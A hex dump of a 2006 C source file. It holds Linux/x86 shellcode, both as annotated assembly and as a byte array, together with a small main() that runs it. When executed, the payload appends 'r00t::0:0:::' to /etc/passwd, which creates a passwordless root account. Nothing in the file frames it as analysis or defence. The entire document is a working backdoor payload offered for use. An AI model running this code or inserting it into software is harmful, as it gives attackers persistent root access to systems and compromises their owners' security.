00000000  2f 2a 20 42 79 20 4b 72  69 73 20 4b 61 74 74 65  |/* By Kris Katte|
00000010  72 6a 6f 68 6e 20 31 31  2f 31 34 2f 32 30 30 36  |rjohn 11/14/2006|
00000020  0d 0a 20 2a 0d 0a 20 2a  20 36 39 20 62 79 74 65  |.. *.. * 69 byte|
00000030  20 73 68 65 6c 6c 63 6f  64 65 20 74 6f 20 61 64  | shellcode to ad|
00000040  64 20 72 6f 6f 74 20 75  73 65 72 20 27 72 30 30  |d root user 'r00|
00000050  74 27 20 77 69 74 68 20  6e 6f 20 70 61 73 73 77  |t' with no passw|
00000060  6f 72 64 20 74 6f 20 2f  65 74 63 2f 70 61 73 73  |ord to /etc/pass|
00000070  77 64 0d 0a 20 2a 0d 0a  20 2a 20 66 6f 72 20 4c  |wd.. *.. * for L|
00000080  69 6e 75 78 2f 78 38 36  0d 0a 20 2a 0d 0a 20 2a  |inux/x86.. *.. *|
00000090  0d 0a 20 2a 0d 0a 20 2a  20 73 65 63 74 69 6f 6e  |.. *.. * section|
000000a0  20 2e 74 65 78 74 0d 0a  20 2a 0d 0a 20 2a 20 20  | .text.. *.. *  |
000000b0  20 20 20 20 67 6c 6f 62  61 6c 20 5f 73 74 61 72  |    global _star|
000000c0  74 0d 0a 20 2a 0d 0a 20  2a 20 5f 73 74 61 72 74  |t.. *.. * _start|
000000d0  3a 0d 0a 20 2a 0d 0a 20  2a 20 3b 20 6f 70 65 6e  |:.. *.. * ; open|
000000e0  28 22 2f 65 74 63 2f 2f  70 61 73 73 77 64 22 2c  |("/etc//passwd",|
000000f0  20 4f 5f 57 52 4f 4e 4c  59 20 7c 20 4f 5f 41 50  | O_WRONLY | O_AP|
00000100  50 45 4e 44 29 0d 0a 20  2a 0d 0a 20 2a 20 20 20  |PEND).. *.. *   |
00000110  20 20 20 70 75 73 68 20  62 79 74 65 20 35 0d 0a  |   push byte 5..|
00000120  20 2a 20 20 20 20 20 20  70 6f 70 20 65 61 78 0d  | *      pop eax.|
00000130  0a 20 2a 20 20 20 20 20  20 78 6f 72 20 65 63 78  |. *      xor ecx|
00000140  2c 20 65 63 78 0d 0a 20  2a 20 20 20 20 20 20 70  |, ecx.. *      p|
00000150  75 73 68 20 65 63 78 0d  0a 20 2a 20 20 20 20 20  |ush ecx.. *     |
00000160  20 70 75 73 68 20 30 78  36 34 37 37 37 33 37 33  | push 0x64777373|
00000170  0d 0a 20 2a 20 20 20 20  20 20 70 75 73 68 20 30  |.. *      push 0|
00000180  78 36 31 37 30 32 66 32  66 0d 0a 20 2a 20 20 20  |x61702f2f.. *   |
00000190  20 20 20 70 75 73 68 20  30 78 36 33 37 34 36 35  |   push 0x637465|
000001a0  32 66 0d 0a 20 2a 20 20  20 20 20 20 6d 6f 76 20  |2f.. *      mov |
000001b0  65 62 78 2c 20 65 73 70  0d 0a 20 2a 20 20 20 20  |ebx, esp.. *    |
000001c0  20 20 6d 6f 76 20 63 78  2c 20 30 32 30 30 31 51  |  mov cx, 02001Q|
000001d0  0d 0a 20 2a 20 20 20 20  20 20 69 6e 74 20 30 78  |.. *      int 0x|
000001e0  38 30 0d 0a 20 2a 0d 0a  20 2a 20 20 20 20 20 20  |80.. *.. *      |
000001f0  6d 6f 76 20 65 62 78 2c  20 65 61 78 0d 0a 20 2a  |mov ebx, eax.. *|
00000200  0d 0a 20 2a 20 3b 20 77  72 69 74 65 28 65 62 78  |.. * ; write(ebx|
00000210  2c 20 22 72 30 30 74 3a  3a 30 3a 30 3a 3a 3a 22  |, "r00t::0:0:::"|
00000220  2c 20 31 32 29 0d 0a 20  2a 0d 0a 20 2a 20 20 20  |, 12).. *.. *   |
00000230  20 20 20 70 75 73 68 20  62 79 74 65 20 34 0d 0a  |   push byte 4..|
00000240  20 2a 20 20 20 20 20 20  70 6f 70 20 65 61 78 0d  | *      pop eax.|
00000250  0a 20 2a 20 20 20 20 20  20 78 6f 72 20 65 64 78  |. *      xor edx|
00000260  2c 20 65 64 78 0d 0a 20  2a 20 20 20 20 20 20 70  |, edx.. *      p|
00000270  75 73 68 20 65 64 78 0d  0a 20 2a 20 20 20 20 20  |ush edx.. *     |
00000280  20 70 75 73 68 20 30 78  33 61 33 61 33 61 33 30  | push 0x3a3a3a30|
00000290  0d 0a 20 2a 20 20 20 20  20 20 70 75 73 68 20 30  |.. *      push 0|
000002a0  78 33 61 33 30 33 61 33  61 0d 0a 20 2a 20 20 20  |x3a303a3a.. *   |
000002b0  20 20 20 70 75 73 68 20  30 78 37 34 33 30 33 30  |   push 0x743030|
000002c0  37 32 0d 0a 20 2a 20 20  20 20 20 20 6d 6f 76 20  |72.. *      mov |
000002d0  65 63 78 2c 20 65 73 70  0d 0a 20 2a 20 20 20 20  |ecx, esp.. *    |
000002e0  20 20 70 75 73 68 20 62  79 74 65 20 31 32 0d 0a  |  push byte 12..|
000002f0  20 2a 20 20 20 20 20 20  70 6f 70 20 65 64 78 0d  | *      pop edx.|
00000300  0a 20 2a 20 20 20 20 20  20 69 6e 74 20 30 78 38  |. *      int 0x8|
00000310  30 0d 0a 20 2a 0d 0a 20  2a 20 3b 20 63 6c 6f 73  |0.. *.. * ; clos|
00000320  65 28 65 62 78 29 0d 0a  20 2a 0d 0a 20 2a 20 20  |e(ebx).. *.. *  |
00000330  20 20 20 20 70 75 73 68  20 62 79 74 65 20 36 0d  |    push byte 6.|
00000340  0a 20 2a 20 20 20 20 20  20 70 6f 70 20 65 61 78  |. *      pop eax|
00000350  0d 0a 20 2a 20 20 20 20  20 20 69 6e 74 20 30 78  |.. *      int 0x|
00000360  38 30 0d 0a 20 2a 0d 0a  20 2a 20 3b 20 65 78 69  |80.. *.. * ; exi|
00000370  74 28 29 0d 0a 20 2a 0d  0a 20 2a 20 20 20 20 20  |t().. *.. *     |
00000380  20 70 75 73 68 20 62 79  74 65 20 31 0d 0a 20 2a  | push byte 1.. *|
00000390  20 20 20 20 20 20 70 6f  70 20 65 61 78 0d 0a 20  |      pop eax.. |
000003a0  2a 20 20 20 20 20 20 69  6e 74 20 30 78 38 30 0d  |*      int 0x80.|
000003b0  0a 20 2a 2f 0d 0a 0d 0a  6d 61 69 6e 28 29 0d 0a  |. */....main()..|
000003c0  7b 0d 0a 20 20 20 20 20  20 20 63 68 61 72 20 73  |{..       char s|
000003d0  68 65 6c 6c 63 6f 64 65  5b 5d 20 3d 0d 0a 20 20  |hellcode[] =..  |
000003e0  20 20 20 20 20 20 20 20  20 20 20 20 20 22 5c 78  |             "\x|
000003f0  36 61 5c 78 30 35 5c 78  35 38 5c 78 33 31 5c 78  |6a\x05\x58\x31\x|
00000400  63 39 5c 78 35 31 5c 78  36 38 5c 78 37 33 5c 78  |c9\x51\x68\x73\x|
00000410  37 33 5c 78 37 37 5c 78  36 34 5c 78 36 38 22 0d  |73\x77\x64\x68".|
00000420  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
00000430  22 5c 78 32 66 5c 78 32  66 5c 78 37 30 5c 78 36  |"\x2f\x2f\x70\x6|
00000440  31 5c 78 36 38 5c 78 32  66 5c 78 36 35 5c 78 37  |1\x68\x2f\x65\x7|
00000450  34 5c 78 36 33 5c 78 38  39 5c 78 65 33 5c 78 36  |4\x63\x89\xe3\x6|
00000460  36 22 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |6"..            |
00000470  20 20 20 22 5c 78 62 39  5c 78 30 31 5c 78 30 34  |   "\xb9\x01\x04|
00000480  5c 78 63 64 5c 78 38 30  5c 78 38 39 5c 78 63 33  |\xcd\x80\x89\xc3|
00000490  5c 78 36 61 5c 78 30 34  5c 78 35 38 5c 78 33 31  |\x6a\x04\x58\x31|
000004a0  5c 78 64 32 22 0d 0a 20  20 20 20 20 20 20 20 20  |\xd2"..         |
000004b0  20 20 20 20 20 20 22 5c  78 35 32 5c 78 36 38 5c  |      "\x52\x68\|
000004c0  78 33 30 5c 78 33 61 5c  78 33 61 5c 78 33 61 5c  |x30\x3a\x3a\x3a\|
000004d0  78 36 38 5c 78 33 61 5c  78 33 61 5c 78 33 30 5c  |x68\x3a\x3a\x30\|
000004e0  78 33 61 5c 78 36 38 22  0d 0a 20 20 20 20 20 20  |x3a\x68"..      |
000004f0  20 20 20 20 20 20 20 20  20 22 5c 78 37 32 5c 78  |         "\x72\x|
00000500  33 30 5c 78 33 30 5c 78  37 34 5c 78 38 39 5c 78  |30\x30\x74\x89\x|
00000510  65 31 5c 78 36 61 5c 78  30 63 5c 78 35 61 5c 78  |e1\x6a\x0c\x5a\x|
00000520  63 64 5c 78 38 30 5c 78  36 61 22 0d 0a 20 20 20  |cd\x80\x6a"..   |
00000530  20 20 20 20 20 20 20 20  20 20 20 20 22 5c 78 30  |            "\x0|
00000540  36 5c 78 35 38 5c 78 63  64 5c 78 38 30 5c 78 36  |6\x58\xcd\x80\x6|
00000550  61 5c 78 30 31 5c 78 35  38 5c 78 63 64 5c 78 38  |a\x01\x58\xcd\x8|
00000560  30 22 3b 0d 0a 0d 0a 20  20 20 20 20 20 20 28 2a  |0";....       (*|
00000570  28 76 6f 69 64 20 28 2a  29 28 29 29 20 73 68 65  |(void (*)()) she|
00000580  6c 6c 63 6f 64 65 29 28  29 3b 0d 0a 7d           |llcode)();..}|
0000058d
